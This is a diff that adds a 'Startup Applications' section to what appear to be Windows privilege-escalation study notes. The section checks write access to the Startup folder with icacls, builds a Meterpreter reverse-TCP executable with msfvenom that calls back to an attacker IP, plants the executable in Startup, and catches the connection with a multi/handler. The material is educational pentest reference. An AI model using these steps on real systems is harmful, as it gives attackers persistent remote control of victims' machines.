@@ -307,6 +307,19 @@ accesschk64.exe -wvu <path to executable>
 > Basically we are going to save our malicious executable over the service executable, and then start the service.
 
 ## Startup Applications
+> We're going to drop a malicious application in the start menu `startup` folder so that it starts automatically.   
+#### Enumeration
+- Verify you have full access to the startup directory
+```shell
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+```
+#### Exploitation
+- Sampe msfvenom reverse meterpreter shell
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[AttackerIP] -f exe -o x.exe
+```
+- Upload and copy the malicious exe to C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+- Fire up the multi/handler in msfconsole(for this example, set the payload to windows/meterpreter/reverse_tcp)
 
 ## DLL Hijacking
 
